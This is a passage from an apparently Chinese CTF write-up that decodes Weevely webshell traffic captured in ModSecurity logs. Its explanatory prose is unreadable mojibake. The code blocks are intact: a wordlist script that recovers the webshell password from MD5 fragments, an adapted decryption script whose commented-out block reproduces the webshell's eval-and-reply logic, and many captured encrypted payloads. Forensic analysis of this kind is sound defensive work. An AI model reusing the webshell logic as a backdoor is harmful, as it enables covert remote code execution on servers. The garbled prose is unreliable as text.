&quot;a0b923820dcc&quot;;</span><br><span class="line">$kf = &quot;509a6f75849b&quot;;</span><br><span class="line">$p = &quot;FTxlZajQkHqbQYY5&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯†ç ä¸º1æ—¶ï¼Œk kh kfåˆ†åˆ«ä¸ºè¿™äº›ï¼ŒæŠŠ1è¿›è¡ŒåŠ å¯† md5ä¸ºc4ca4238a0b923820dcc509a6f75849b</p><p><img src="/images/tiesan/image-20230505195338135.png" alt="image-20230505195338135"></p><p>å¯ä»¥ä»”ç»†æ¯”å¯¹ï¼Œä¸­é—´12ä½å’Œæœ€å12ä½ï¼Œä¹Ÿå°±æ˜¯<code>md5(1)=$k+$kh+$kf</code></p><p>åœ¨æ—¥å¿—ä¸­æ‹¿å‡ºå‡ å¯¹ä»”ç»†çœ‹ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">--4b398f30-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--4b398f30-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--4b398f30-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span><br><span class="line">--4b398f30-H--</span><br><span class="line">Apache-Handler: application/x-httpd-php</span><br><span class="line">Stopwatch: 1575448316609856 1233 (- - -)</span><br><span class="line">Stopwatch2: 1575448316609856 1233; combined=36, p1=12, p2=20, p3=1, p4=0, p5=2, sr=0, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/).</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">Engine-Mode: &quot;DETECTION_ONLY&quot;</span><br><span class="line"></span><br><span class="line">--4b398f30-Z--</span><br><span class="line"></span><br><span class="line">--b4e7ac4b-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5xVlRB77cp4NqcyONKnd8Y509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--b4e7ac4b-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 88</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--b4e7ac4b-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hIrHiDBomzfE8pePx77Td8JIIi16QudxfqETUyTeNsQQ==509a6f75849b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™ä¸ª509a6f75849bä¸ºæœ€åçš„ï¼Œä¹Ÿå°±æ˜¯kfäº†ï¼Œa0b923820dccä¸ºä¸­é—´çš„äº†ï¼Œä¸”éƒ½æ˜¯12ä½</p><p>ç»“åˆè¾“å‡º$p$kh$r$kfè¿™å‡ ä¸ªå˜é‡çš„å€¼æ—¶ï¼Œä¹Ÿå°±å¯ä»¥åˆ¤æ–­å‡ºï¼Œè¿™ä¸ªæµé‡åŒ…çš„ä¸€äº›å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$kh = &quot;a0b923820dcc&quot;;</span><br><span class="line">$kf = &quot;509a6f75849b&quot;; </span><br><span class="line">$p = &quot;kbPze6iWSynLVEi5&quot;;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è¿˜å·®ä¸€ä¸ªå˜é‡k ä¹Ÿæ˜¯æœ€é‡è¦çš„å˜é‡ï¼Œå› ä¸ºmd5(1)=$k+$kh+$kfï¼Œæ‰€ä»¥å¦‚æœå¯†ç ä¸å¤æ‚çš„è¯ï¼Œå¯ä»¥åæ¨å¯†ç ,</p><p>è¿™é‡Œç»™ä¸ªç®€å•è„šæœ¬çˆ†ç ´å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">file = open(&quot;D:\\vscodework\\ctf\\tttt\\passwords.txt&quot;,&quot;r&quot;)</span><br><span class="line">file = file.readlines()</span><br><span class="line"></span><br><span class="line">def baopomd5():</span><br><span class="line">    for i in range(len(file)):</span><br><span class="line">        t =  str(file[i]).strip()</span><br><span class="line">        md5_result = hashlib.md5(t.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">        #print(md5_result)</span><br><span class="line">        if md5_result[8:33] == &#x27;a0b923820dcc509a6f75849b&#x27;:</span><br><span class="line">            print(t)</span><br><span class="line">            print(md5_result)</span><br><span class="line">            break</span><br><span class="line">baopomd5()</span><br><span class="line">//1</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å–åˆ°äº†æœ¨é©¬å¯†ç äº†ã€‚ä¹Ÿå¯ä»¥çŸ¥é“å˜é‡käº†</p><p>å½“ç„¶ï¼Œå¦‚æœæœ‰ç½‘ç»œçš„è¯ï¼Œä¹Ÿå¯ä»¥æ‹¿ç€a0b923820dcc509a6f75849bè¿™ä¸ªå»cmd5æŸ¥ä¸€ä¸‹</p><p><img src="/images/tiesan/image-20230505202525359.png" alt="image-20230505202525359"></p><p>flag PUT 1</p><h4 id="8-10"><a href="#8-10" class="headerlink" title="8-10"></a>8-10</h4><p>å› ä¸ºå¤ªèœäº†ï¼Œç°åœºä¸­å¹¶æ²¡æœ‰åšå‡ºæ¥åé¢çš„ï¼Œæ‰€ä»¥å¹¶ä¸çŸ¥åˆ°é¢˜ç›®æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œæˆ‘ä»¬æŠŠæ‰€æœ‰çš„æµé‡éƒ½ç»™ä»–è§£å‡ºæ¥ï¼Œè¿™æ ·ä»–é—®ä»€ä¹ˆï¼Œæˆ‘ä»¬éƒ½æ˜¯çŸ¥é“çš„ï¼Œ</p><p>æŸ¥é˜…å…¶ä»–å¤§å¸ˆå‚…æ–‡ç« ï¼Œ<code>https://artikrh.sh/posts/weevely-backdoor-analysis.html</code>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå¯ä»¥å¾—å‡ºè§£å¯†è„šæœ¬ï¼Œè¿™é‡Œå°†åæ¨å‡ºæ¥çš„k på•¥çš„å†™ä¸Šå³å¯ï¼ŒæŠŠphpinfoæ›¿æ¢ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>; <span class="comment">// FIRST PART: 8 first chars</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>; <span class="comment">// SECOND PART: 12 next chars</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>; <span class="comment">// THIRD PART: 12 last chars</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span>; <span class="comment">// Random data (?)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123; <span class="comment">// XOR</span></span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">              <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpinput</span> = <span class="string">&quot;kbPze6iWSynLVEi5a0b923820dccG6iwTn8e4RdMG7SuHPv+OWMVTWXF509a6f75849b</span></span><br><span class="line"><span class="string">&quot;</span>; <span class="comment">// HTTP POST data  //æ›¿æ¢æ•°æ®å³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$phpinput</span>, <span class="variable">$m</span>) == <span class="number">1</span>) &#123; <span class="comment">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$phpcode</span> = @gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)); <span class="comment">// gunzip(XOR(b64decode(data), key))</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$phpcode</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_start(); // Turn on output buffering</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>($phpcode); // Executes PHP code</span></span><br><span class="line"><span class="comment">    $o = <span class="doctag">@ob</span>_get_contents(); // Save stdout to $o</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_end_clean(); // Clean (erase) the output buffer and turn off output buffering</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    $r = <span class="doctag">@base</span>64_encode(<span class="doctag">@x</span>(<span class="doctag">@gzcompress</span>($o), $k)); // b64encode(XOR(gzip(stdout)), key)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    print(&quot;$p$kh$r$kf&quot;); // HTTP Response data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªè„šæœ¬ï¼Œå…ˆå°†æ‰€æœ‰ç›¸å…³çš„éƒ½æå‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = a.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;zYgIi?&#123;4d\&gt;;=h&#x27;=&quot;</span> <span class="keyword">in</span> a[i]:</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span> <span class="keyword">in</span> a[i]:</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>è¿™è¾¹ä¸ºäº†æ–¹ä¾¿ç›´æ¥è§£é™¤æ‰€æœ‰çš„å†…å®¹```</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>; <span class="comment">// FIRST PART: 8 first chars</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>; <span class="comment">// SECOND PART: 12 next chars</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>; <span class="comment">// THIRD PART: 12 last chars</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span>; <span class="comment">// Random data (?)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $k=c4ca4238</span></span><br><span class="line"><span class="comment">// p=kbPze6iWSynLVEi5   kh=a0b923820dcc   r=G6hIr/gf+3FmNGpnNrk=  kf=509a6f75849b</span></span><br><span class="line"><span class="comment">// User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --009f0c02-C--</span></span><br><span class="line"><span class="comment">// zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhh0QqfhIsER6fBWq/ExP/Xn/dbbkt9UyMmTZbH0509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="comment">//   p kh</span></span><br><span class="line"><span class="comment">// kbPze6iWSynLVEi5a0b923820dccG6hIr/gf+3FmNGpnNrk=509a6f75849b</span></span><br><span class="line"><span class="comment">// p=kbPze6iWSynLVEi5   kh=a0b923820dcc   r=G6hIr/gf+3FmNGpnNrk=  kf=509a6f75849b</span></span><br><span class="line"><span class="comment">//1 c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123; <span class="comment">// XOR</span></span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">              <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpinput</span> = <span class="string">&quot;zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhkUQzRhNKPnnY3cu+qs2BIOHiFNntNUyMn84bsU509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hQ0ICCA9thNGc4NSw=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhh0QqfhIsER6fBWq/ExP/Xn/dbbkt9UyMmTZbH0509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hIr/gf+3FmNGpnNrk=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gO7HU48BhzcUxCRe5GF2bbMuvsRCE+z/6L1bXQ7rONNrqfwyzsGRBSrDkGBXkjP7jGdJzIVLBSCEHjGovh1lRYhkrA4FVhrQUtC0p4nda7tFgpVNS6qooe2ogg7JvX1VfPWYITlTcLnavyLek4awkX0Zw7+m154g509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6goTXx+/XBmNGs/NlE=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhkVwrXyqTeZi5Gu0YDBKHPj/E7JEKy4Zex13suS31TIyjOdzvw509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iwTn8e4RdMG7SuHPv+OWMVTWXF509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5xVlRB77cp4NqcyONKnd8Y509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hIrHiDBomzfE8pePx77Td8JIIi16QudxfqETUyTeNsQQ==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5yl1R2FkkmJEhgr4cotYXQ3Mg9sdao509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iQqPgZnmhL+q9M/HtmCLUHV7EH4gaLV+JQtAfgePVS48jRBLkECzJkVTU8xD5oEx+pNcR9HWlTBmNDH1EQEzA35rEkVRP/s2hiyyCnQc9o4ZRg7fM2OID/eMI=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wVFK5L3MT3ENlYLcbSx0deGyvhyi1hVDUyMJZ6HQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6ju8GV98Qhz87yaHagN+eAvJ/It/i1+tPwXOqOEAMnK9RKhJpaXI627DHAku6vIt3+Nlsvv1nIC6RHo50iOxaciNVFZMjTm/gNvZ8OKdLXmCiVQ7MgwXhtarloinKt0OPi1TOy/nmUDKxRQ6KFVU0jcwF3+anvQTAkiTnj6t99CPW0HtqALHPa3L9KfR6kE2KA+oz79Ul6PwETFQ1ZzaEKsMc7OnS2nx2VNcnlL+X0rMmzWd7Bb+W2lCWIX7b/OULvsknpK9UxK5vNN70TgtB+LiFtb7cS0Psxn7P91HmCisVlm64S43v9w94S+ea592n6HOd1wwx8l4RKCLwXDJyer7SWkUsIcMW71pMNmtPyG+hHd7NfNoWHlyB/MCNnKkuR0p9ydyQ==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5zVJxOL0kuJk6QX03RTR8fQpRggup16Y0EzMyWnLdE509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iwTB6dG+q2MUFkd7eRxJ8mawBdWpfY8a7PwVSQU1AJUQ/JlK1pqs9r//CsoGz2ZjTw6js4509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wVFK5L3MT3ENkkX0eSh/YfKuqRejaWYTTchSEx509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6gW83VFkQhztIycI0/8691jViE1QYBT/J+3xKKYHo8jturlEKCDrJ3ODhZPW7cBHeuv+v1WWRFuKJrC2n+ACbuUMv3aJYwmIyaNr5oFdE8sj0Tsp1QRH69/X/LOzE8i9VrUCNptOmXpxD7UXoFtHdQHUKdTLq527SfCE8+J/qK2Xfi+msX9LOHkElwMt4D34zXnkR5RMcbj9BRi04nzsDdGo0BoxziWmY2NJQpSW1vTWGR7ZfZ+h8okgJxyGGEbQN8dGnAn4sXJBGCyP6t65G6YgW6W3jUNJQbmgMEHN7l0jpM+aNOf6VVn8fb4bpcivqfKLPXsX5RWicu3mGCvRP1kfzDFygvOPL4gVe2s+WlTMUc/sHMd4GeYcVt7PCmwkRXtbrMmlNEQ9SheW+/RNsRZMtH4ccSXpnqNiVar/ZqWRviaqmyk2egGW2PbSYGXHbbMj+IVWHtJSEDpXVdu4lAq6q1NcV9k+LsWuQSlb+50mzds4yXG/+xv18pdH3ZfsJ6wBsot/QScP0HkRnhfwnQDApLF509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6hu7f84sxhzNBykZ71wlQglJ3HJe1txaQkH9JCNXBcQLOW46NyaEoLhZ1hTQtoCqE45TeVxGOGTZJGWZXtFyej9PX0vTbDpsr2l6o2y7obzgmNZniS0LvqJZzVpHddkw2RvH8q3VCfc509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hgYTQyMzk=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wlMz13QPB0uCY/Fe7Ab6wYxj+5973i46WvqRkzB2PY3CtU509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6juLnmZ8QhziJQ2+HdjiCqCt5k1D/iDX+pc8ex0OqLVQvSTyMUF2iZ7/RdCquqhns+avLeEthrYZVfs5lLNhkyE0ZJ5i/PJTaqy/OQKQhLQ0ehYOW/PgNJ3ywJLUkyTaxa0CyZ5u4ZRXj47cMzlZd+NKvhBAFRB/UvVj3dJNbPw9HEL8hb6Mpea3RlV+tNi7XWnVn8mK0SO9/vRrY8HgBX4qAY6+isLpjhB6ZXnXQSI3J0UWM67Mqwr1zBvEK4iRngV9L4PM1njaRc=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6hu7X84sxh3NMyDfl9i9wQlJnHpFvkc5kpfRN3EiqHibe8QrxUa2D48MSvU0EqwAaxPsHkB6t/F3Mw8nu7xL8EJxjmj0mvRuvwC0ht2wDiVjqHXnwKYaeOODfkuCwGl8ktclXksUw509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hgYTQyMzk=509a6f75849b&quot;</span>;</span><br><span class="line"><span class="variable">$phpinput</span> = explode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$phpinput</span>);<span class="comment">// HTTP POST data</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 